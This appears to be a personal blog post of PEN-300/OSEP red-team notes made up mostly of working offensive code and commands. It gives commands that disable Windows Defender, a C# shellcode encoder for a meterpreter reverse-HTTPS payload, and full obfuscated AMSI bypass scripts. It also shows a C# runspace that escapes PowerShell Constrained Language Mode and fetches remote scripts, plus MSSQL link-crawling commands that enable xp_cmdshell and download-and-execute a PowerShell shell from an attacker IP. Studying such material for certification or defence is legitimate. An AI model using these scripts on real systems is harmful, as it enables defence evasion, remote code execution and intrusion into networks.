---
title: Offensive-Security PEN-300 Notes
author: 00x71
date: 2022-02-01 21:00:00 0000
categories: [RED_TEAM, OSEP,Offensive-Security]
tags: [Red_Team,OSEP,Offensive-Security]
---


# Disable Anti-Virus

## Disable Windows Defender
```powershell
REG ADD "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v
"DisableBehaviorMonitoring " /t REG_DWORD /d 1 /f
```
or

```powershell
Set-MpPreference -DisableRealtimeMonitoring $true
```
or
```
cmd /c "C:\Program Files\Windows Defender\MpCmdRun.exe" -removedefinitions -all
```

# Anti-Virus Evasion

## Shellcode XOR Encryptor Written in C#

```CSharp
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
namespace Helper
{
class Program
{
static void Main(string[] args)
{
//msfvenom -p windows/x64/meterpreter/reverse_https
LHOST=192.168.XX.XX LPORT=443 -f csharp
byte[] buf = new byte[770] {
};
byte[] encoded = new byte[buf.Length];
for (int i = 0; i < buf.Length; i++)
{
encoded[i] = (byte)(((uint)buf[i] + 2) & 0xff);
}
StringBuilder hex = new StringBuilder(encoded.Length * 2);
foreach (byte b in encoded)
{
hex.AppendFormat("0x{0:x2}, ", b);
}
Console.WriteLine("The payload is: " + hex.ToString());
Console.WriteLine("Length was: " + buf.Length.ToString());
}
}
}

```


# Bypass AMSI

Using one of the bypasses from `amsi.fail` which is detected:

```powershell

#Matt Graebers second Reflection method 
$fjujQSw=$null;$bfky="$(('S'+'y'+'s'+'t'+'e'+'m').nOrMAlIze([ChAr](70*40/40)+[CHaR]([byte]0x6f)+[chAr](94+20)+[ChaR](109+62-62)+[ChAR](27+41)) -replace [chAr](92)+[CHaR]([BYTe]0x70)+[cHar](23+100)+[cHar]([byTe]0x4d)+[chAR]([bYtE]0x6e)+[cHar]([byte]0x7d)).$(('Mãnàg'+'ement').NOrmAliZE([CHAR]([BYTe]0x46)+[chAr](36+75)+[CHaR](114)+[cHAr](63+46)+[CHaR](17+51)) -replace [cHAR](41+51)+[ChAR](112*76/76)+[cHAr]([byTe]0x7b)+[cHar](77+13-13)+[chaR]([BYTe]0x6e)+[ChAR](125+9-9)).$([cHAR](65)+[CHaR]([BYte]0x75)+[CHAR](116+72-72)+[CHAR](67+44)+[chAR]([bytE]0x6d)+[chAr](97+9-9)+[Char](116*72/72)+[CHAr]([byte]0x69)+[Char]([byTe]0x6f)+[chaR]([Byte]0x6e)).$([CHAR]([BYte]0x41)+[char]([ByTe]0x6d)+[cHAr](115+39-39)+[CHAR]([Byte]0x69)+[cHaR](85*12/12)+[chAR]([byte]0x74)+[ChaR](105*12/12)+[ChaR]([BytE]0x6c)+[char](115))";$dgbiziuzftrzlf="+[cHaR]([byTE]0x6c)+[CHAr]([BYTE]0x70)+[chAr]([byte]0x7a)+[cHar]([bYtE]0x74)+[cHAR](105)+[ChAR](118+34-34)+[cHAR](101)+[CHAr](97)+[CHAR]([Byte]0x63)+[cHAR]([ByTE]0x65)+[CHaR](106)+[ChAR]([BYte]0x73)+[ChAR]([BYte]0x61)+[CHar](121+46-46)+[Char]([BYTe]0x61)+[CHaR](106)+[chAr]([Byte]0x67)+[cHAR](78+21)+[CHar](111*77/77)+[CHAr](91+17)+[CHAR](111+29-29)+[CHaR](1+106)+[ChAr](115+76-76)+[cHAR](92+19)+[char]([bYTe]0x65)+[cHar]([bytE]0x7a)+[CHAr](97*40/40)+[char]([bYTE]0x6d)+[cHaR](110*34/34)";[Threading.Thread]::Sleep(851);[Runtime.InteropServices.Marshal]::("$(('Wrìte'+'Înt32').NOrmalize([CHaR](51+19)+[Char](111)+[cHAr](114*43/43)+[cHaR](75+34)+[CHAR]([bYTE]0x44)) -replace [cHar](70+22)+[chAR]([bYtE]0x70)+[Char](108+15)+[chAr]([byTE]0x4d)+[ChaR](110)+[CHar](125*16/16))")([Ref].Assembly.GetType($bfky).GetField("$([CHAR]([bYtE]0x61)+[CHaR]([bYtE]0x6d)+[CHar]([byTe]0x73)+[ChaR]([bytE]0x69)+[chAR]([ByTE]0x43)+[CHAR](62+49)+[CHaR](110+108-108)+[chAr]([ByTe]0x74)+[chAR]([BYte]0x65)+[cHAR]([BYTE]0x78)+[char]([ByTE]0x74))",[Reflection.BindingFlags]"NonPublic,Static").GetValue($fjujQSw),0x32aaa0ce);
```

We can use `ISE-Steroids`, a powershell plugin to obfuscate the bypass:

<img src="https://raw.githubusercontent.com/00x71/00x71.github.io/master/_posts/images/PEN-300/1.png" style="display: block; margin: auto;" />

![[Pasted image 20220124044217.png]]

The end result which can bypass AMSI:

```powershell

#Obfuscated version of Matt Graebers second Reflection method 
${/=\/==\_/===\_/==}=$null;${_/\__/\__/=\/=\_/}="$(('S'+'y'+'s'+'t'+'e'+'m').nOrMAlIze([ChAr](70*40/40)+[CHaR]([byte]0x6f)+[chAr](94+20)+[ChaR](109+62-62)+[ChAR](27+41)) -replace [chAr](92)+[CHaR]([BYTe]0x70)+[cHar](23+100)+[cHar]([byTe]0x4d)+[chAR]([bYtE]0x6e)+[cHar]([byte]0x7d)).$(($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQDjAG4A4ABnAA==')))+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQBtAGUAbgB0AA==')))).NOrmAliZE([CHAR]([BYTe]0x46)+[chAr](36+75)+[CHaR](114)+[cHAr](63+46)+[CHaR](17+51)) -replace [cHAR](41+51)+[ChAR](112*76/76)+[cHAr]([byTe]0x7b)+[cHar](77+13-13)+[chaR]([BYTe]0x6e)+[ChAR](125+9-9)).$([cHAR](65)+[CHaR]([BYte]0x75)+[CHAR](116+72-72)+[CHAR](67+44)+[chAR]([bytE]0x6d)+[chAr](97+9-9)+[Char](116*72/72)+[CHAr]([byte]0x69)+[Char]([byTe]0x6f)+[chaR]([Byte]0x6e)).$([CHAR]([BYte]0x41)+[char]([ByTe]0x6d)+[cHAr](115+39-39)+[CHAR]([Byte]0x69)+[cHaR](85*12/12)+[chAR]([byte]0x74)+[ChaR](105*12/12)+[ChaR]([BytE]0x6c)+[char](115))";${_/=======\/==\/\/}=$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KwBbAGMASABhAFIAXQAoAFsAYgB5AFQARQBdADAAeAA2AGMAKQArAFsAQwBIAEEAcgBdACgAWwBCAFkAVABFAF0AMAB4ADcAMAApACsAWwBjAGgAQQByAF0AKABbAGIAeQB0AGUAXQAwAHgANwBhACkAKwBbAGMASABhAHIAXQAoAFsAYgBZAHQARQBdADAAeAA3ADQAKQArAFsAYwBIAEEAUgBdACgAMQAwADUAKQArAFsAQwBoAEEAUgBdACgAMQAxADgAKwAzADQALQAzADQAKQArAFsAYwBIAEEAUgBdACgAMQAwADEAKQArAFsAQwBIAEEAcgBdACgAOQA3ACkAKwBbAEMASABBAFIAXQAoAFsAQgB5AHQAZQBdADAAeAA2ADMAKQArAFsAYwBIAEEAUgBdACgAWwBCAHkAVABFAF0AMAB4ADYANQApACsAWwBDAEgAYQBSAF0AKAAxADAANgApACsAWwBDAGgAQQBSAF0AKABbAEIAWQB0AGUAXQAwAHgANwAzACkAKwBbAEMAaABBAFIAXQAoAFsAQgBZAHQAZQBdADAAeAA2ADEAKQArAFsAQwBIAGEAcgBdACgAMQAyADEAKwA0ADYALQA0ADYAKQArAFsAQwBoAGEAcgBdACgAWwBCAFkAVABlAF0AMAB4ADYAMQApACsAWwBDAEgAYQBSAF0AKAAxADAANgApACsAWwBjAGgAQQByAF0AKABbAEIAeQB0AGUAXQAwAHgANgA3ACkAKwBbAGMASABBAFIAXQAoADcAOAArADIAMQApACsAWwBDAEgAYQByAF0AKAAxADEAMQAqADcANwAvADcANwApACsAWwBDAEgAQQByAF0AKAA5ADEAKwAxADcAKQArAFsAQwBIAEEAUgBdACgAMQAxADEAKwAyADkALQAyADkAKQArAFsAQwBIAGEAUgBdACgAMQArADEAMAA2ACkAKwBbAEMAaABBAHIAXQAoADEAMQA1ACsANwA2AC0ANwA2ACkAKwBbAGMASABBAFIAXQAoADkAMgArADEAOQApACsAWwBjAGgAYQByAF0AKABbAGIAWQBUAGUAXQAwAHgANgA1ACkAKwBbAGMASABhAHIAXQAoAFsAYgB5AHQARQBdADAAeAA3AGEAKQArAFsAQwBIAEEAcgBdACgAOQA3ACoANAAwAC8ANAAwACkAKwBbAGMAaABhAHIAXQAoAFsAYgBZAFQARQBdADAAeAA2AGQAKQArAFsAYwBIAGEAUgBdACgAMQAxADAAKgAzADQALwAzADQAKQA=')));[Threading.Thread]::Sleep(851);[Runtime.InteropServices.Marshal]::("$(($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwByAOwAdABlAA==')))+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('zgBuAHQAMwAyAA==')))).NOrmalize([CHaR](51+19)+[Char](111)+[cHAr](114*43/43)+[cHaR](75+34)+[CHAR]([bYTE]0x44)) -replace [cHar](70+22)+[chAR]([bYtE]0x70)+[Char](108+15)+[chAr]([byTE]0x4d)+[ChaR](110)+[CHar](125*16/16))")([Ref].Assembly.GetType(${_/\__/\__/=\/=\_/}).GetField("$([CHAR]([bYtE]0x61)+[CHaR]([bYtE]0x6d)+[CHar]([byTe]0x73)+[ChaR]([bytE]0x69)+[chAR]([ByTE]0x43)+[CHAR](62+49)+[CHaR](110+108-108)+[chAr]([ByTe]0x74)+[chAR]([BYte]0x65)+[cHAR]([BYTE]0x78)+[char]([ByTE]0x74))",[Reflection.BindingFlags]$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwA=')))).GetValue(${/=\/==\_/===\_/==}),0x32aaa0ce);
```

# Bypass Constrained Language Mode (CLM)

## Check Powershell Language Mode

```Powershell
$ExecutionContext.SessionState.LanguageMode
```

## Bypass CLM by Downgrade Powershell

Since Constrained Language Mode introduced in Powershell V3, downgrade to an older versions of Powershell should bypass CLM restrection. Just specify powershell version 2 by using the arguemnt `-v2` when run poweshell process. Note that it might not work in the most cases these days.

```Powershell
powershell -v2
```

## Custom PowerShell Runspace written in C#

Custom PowerShell runspcase enable attackers to bypass Constrained Language Mode (CLM) or if an Applocker policy is implemented.

```CSharp
using System;
using System.Management.Automation;
using System.Management.Automation.Runspaces;
namespace PowerShell_RunSpace
{
    class Program
    {
        static void Main(string[] args)
        {
            Runspace rs = RunspaceFactory.CreateRunspace();
            rs.Open();
            PowerShell ps = PowerShell.Create();
            ps.Runspace = rs;
            String cmd = "$ExecutionContext.SessionState.LanguageMode | Out-File -FilePath C:\\Tools\\test.txt";
            cmd = "(New-Object System.Net.WebClient).DownloadString('http://192.168.X.X/PowerUp.ps1') | IEX; Invoke-AllChecks | Out-File -FilePath C:\\Tools\\AllChecks-Results.txt";
            ps.AddScript(cmd);
            ps.Invoke();
            rs.Close();

        }
    }
}

```

# Attacking MSSQL 

## Microsoft SQL Server Enumration using PowerUpSQL.ps1

### Find MSSQL Servers in the current domain 
```
Get-SQLInstanceDomain | Get-SQLConnectionTest
```

### Crawl SQL Links

```
Get-SQLServerLinkCrawl -Instance "SQL1.TARGET.LOCAL, 1433"
```

```
Get-SQLServerLinkCrawl -Instance "SQL1.TARGET.LOCAL, 1433" -Query "select * from master..syslogins" | ft
```

## Execute Commands

### Using CrackMapExec 

#### Execute CMD Command
```bash
crackmapexec mssql -d <Domain name> -u <username> -p <password> -x "whoami /all"
```

#### Execute Powershell Command using Username and HASH

```bash
crackmapexec mssql -d <Domain name> -u <username> -H <HASH> -X '$PSVersionTable'
```

## Abuse MSSQL Trusted Links

### Using PowerUpSQL.ps1 (Thanks to https://book.hacktricks.xyz/windows/active-directory-methodology/mssql-trusted-links)

```powershell
Import-Module .\PowerupSQL.psd1

#Get local MSSQL instance (if any)
Get-SQLInstanceLocal
Get-SQLInstanceLocal | Get-SQLServerInfo

#If you don't have a AD account, you can try to find MSSQL scanning via UDP
#First, you will need a list of hosts to scan
Get-Content c:\temp\computers.txt | Get-SQLInstanceScanUDP –Verbose –Threads 10

#If you have some valid credentials and you have discovered valid MSSQL hosts you can try to login into them
#The discovered MSSQL servers must be on the file: C:\temp\instances.txt
Get-SQLInstanceFile -FilePath C:\temp\instances.txt | Get-SQLConnectionTest -Verbose -Username test -Password test

## FROM INSIDE OF THE DOMAIN
#Get info about valid MSQL instances running in domain
#This looks for SPNs that starts with MSSQL (not always is a MSSQL running instance)
Get-SQLInstanceDomain | Get-SQLServerinfo -Verbose 

#Test connections with each one
Get-SQLInstanceDomain | Get-SQLConnectionTestThreaded -verbose

#Try to connect and obtain info from each MSSQL server (also useful to check conectivity)
Get-SQLInstanceDomain | Get-SQLServerInfo -Verbose

#Dump an instance (a lotof CVSs generated in current dir)
Invoke-SQLDumpInfo -Verbose -Instance "dcorp-mssql"

#Look for MSSQL links of an accessible instance
Get-SQLServerLink -Instance dcorp-mssql -Verbose #Check for DatabaseLinkd > 0

#Crawl trusted links, starting form the given one (the user being used by the MSSQL instance is also specified)
Get-SQLServerLinkCrawl -Instance mssql-srv.domain.local -Verbose

#If you are sysadmin in some trusted link you can enable xp_cmdshell with:
Get-SQLServerLinkCrawl -instance "<INSTANCE1>" -verbose -Query 'EXECUTE(''sp_configure ''''xp_cmdshell'''',1;reconfigure;'') AT "<INSTANCE2>"'

#Execute a query in all linked instances (try to execute commands), output should be in CustomQuery field
Get-SQLServerLinkCrawl -Instance mssql-srv.domain.local -Query "exec master..xp_cmdshell 'whoami'"

#Obtain a shell
Get-SQLServerLinkCrawl -Instance dcorp-mssql  -Query 'exec master..xp_cmdshell "powershell iex (New-Object Net.WebClient).DownloadString(''http://172.16.100.114:8080/pc.ps1'')"'

#Check for possible vulnerabilities on an instance where you have access
Invoke-SQLAudit -Verbose -Instance "dcorp-mssql.dollarcorp.moneycorp.local"

#Try to escalate privileges on an instance
Invoke-SQLEscalatePriv –Verbose –Instance "SQLServer1\Instance1"
```

